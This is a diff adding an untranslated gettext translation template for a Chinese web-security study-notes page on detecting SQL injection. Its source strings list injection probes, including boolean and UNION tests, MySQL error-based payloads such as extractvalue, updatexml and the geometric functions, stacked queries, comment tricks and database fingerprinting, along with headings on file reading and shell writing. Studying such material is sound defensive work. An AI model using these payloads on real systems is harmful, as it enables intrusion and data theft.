@@ -1,0 +1,333 @@
+# SOME DESCRIPTIVE TITLE.
+# Copyright (C) 2019-2026, Lyle
+# This file is distributed under the same license as the Web安全学习笔记 package.
+# FIRST AUTHOR <EMAIL@ADDRESS>, 2026.
+#
+msgid ""
+msgstr ""
+"Project-Id-Version: Web安全学习笔记 1.0\n"
+"Report-Msgid-Bugs-To: \n"
+"POT-Creation-Date: 2026-06-17 07:02+0800\n"
+"PO-Revision-Date: YEAR-MO-DA HO:MI+ZONE\n"
+"Last-Translator: FULL NAME <EMAIL@ADDRESS>\n"
+"Language: en\n"
+"Language-Team: en <LL@li.org>\n"
+"Plural-Forms: nplurals=2; plural=(n != 1);\n"
+"MIME-Version: 1.0\n"
+"Content-Type: text/plain; charset=utf-8\n"
+"Content-Transfer-Encoding: 8bit\n"
+"Generated-By: Babel 2.18.0\n"
+
+#: ../../source/vuln/sql/fuzz.rst:2
+msgid "注入检测"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:5
+msgid "常见的注入点"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:6
+msgid "GET/POST/PUT/DELETE参数"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:7
+msgid "X-Forwarded-For"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:8
+msgid "文件名"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:11
+msgid "Fuzz注入点"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:12
+msgid "``'`` / ``\"``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:13
+msgid "``1/1``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:14
+msgid "``1/0``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:15
+msgid "``and 1=1``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:16
+msgid "``\" and \"1\"=\"1``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:17
+msgid "``and 1=2``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:18
+msgid "``or 1=1``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:19
+msgid "``or 1=``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:20
+msgid "``' and '1'='1``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:21
+msgid "``+`` ``-`` ``^`` ``*`` ``%`` ``/``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:22
+msgid "``<<`` ``>>`` ``||`` ``|`` ``&`` ``&&``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:23
+msgid "``~``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:24
+msgid "``!``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:25
+msgid "``@``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:26
+msgid "反引号执行"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:29
+msgid "测试用常量"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:30
+msgid "``@@version``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:31
+msgid "``@@servername``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:32
+msgid "``@@language``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:33
+msgid "``@@spid``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:36
+msgid "测试列数"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:37
+msgid ""
+"例如 ``http://www.foo.com/index.asp?id=12+union+select+null,null--`` ，不断增加 "
+"``null`` 至不返回"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:40
+msgid "报错注入"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:41
+msgid "``select 1/0``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:42
+msgid ""
+"``select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from"
+"  information_schema.tables group by x)a``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:43
+msgid "``extractvalue(1, concat(0x5c,(select user())))``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:44
+msgid "``updatexml(0x3a,concat(1,(select user())),1)``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:45
+msgid "``exp(~(SELECT * from(select user())a))``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:46
+msgid "``ST_LatFromGeoHash((select * from(select * from(select user())a)b))``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:47
+msgid "``GTID_SUBSET(version(), 1)``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:50
+msgid "基于geometric的报错注入"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:51
+msgid "``GeometryCollection((select * from (select * from(select user())a)b))``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:52
+msgid "``polygon((select * from(select * from(select user())a)b))``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:53
+msgid "``multipoint((select * from(select * from(select user())a)b))``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:54
+msgid "``multilinestring((select * from(select * from(select user())a)b))``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:55
+msgid "``LINESTRING((select * from(select * from(select user())a)b))``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:56
+msgid "``multipolygon((select * from(select * from(select user())a)b))``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:58
+msgid ""
+"其中需要注意的是，基于exp函数的报错注入在MySQL 5.5.49后的版本已经不再生效，具体可以参考这个 `commit 95825f "
+"<https://github.com/mysql/mysql-"
+"server/commit/95825fa28a7e84a2f5dbdef5241078f7055c5b04>`_ 。"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:60
+msgid ""
+"而以上列表中基于geometric的报错注入在这个 `commit 5caea4 <https://github.com/mysql/mysql-"
+"server/commit/5caea4a995130cd7c82574acc591ff7c46d9d978>`_ "
+"中被修复，在5.5.x较后的版本中同样不再生效。"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:63
+msgid "堆叠注入"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:64
+msgid "``;select 1``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:67
+msgid "注释符"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:68
+msgid "``#``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:69
+msgid "``--+``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:70
+msgid "``/*xxx*/``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:71
+msgid "``/*!xxx*/``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:72
+msgid "``/*!50000xxx*/``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:75
+msgid "判断过滤规则"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:76
+msgid "是否有trunc"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:77
+msgid "是否过滤某个字符"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:78
+msgid "是否过滤关键字"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:79
+msgid "slash和编码"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:82
+msgid "获取信息"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:83
+msgid "判断数据库类型"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:84
+msgid "``and exists (select * from msysobjects ) > 0`` access数据库"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:85
+msgid "``and exists (select * from sysobjects ) > 0`` SQLServer数据库"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:87
+msgid "判断数据库表"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:88
+msgid "``and exsits (select * from admin)``"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:90
+msgid "版本、主机名、用户名、库名"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:91
+msgid "表和字段"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:92
+msgid "确定字段数"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:93
+msgid "Order By"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:94
+msgid "Select Into"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:95
+msgid "表名、列名"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:98
+msgid "测试权限"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:99
+msgid "文件操作"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:100
+msgid "读敏感文件"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:101
+msgid "写shell"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:102
+msgid "带外通道"
+msgstr ""
+
+#: ../../source/vuln/sql/fuzz.rst:103
+msgid "网络请求"
+msgstr ""
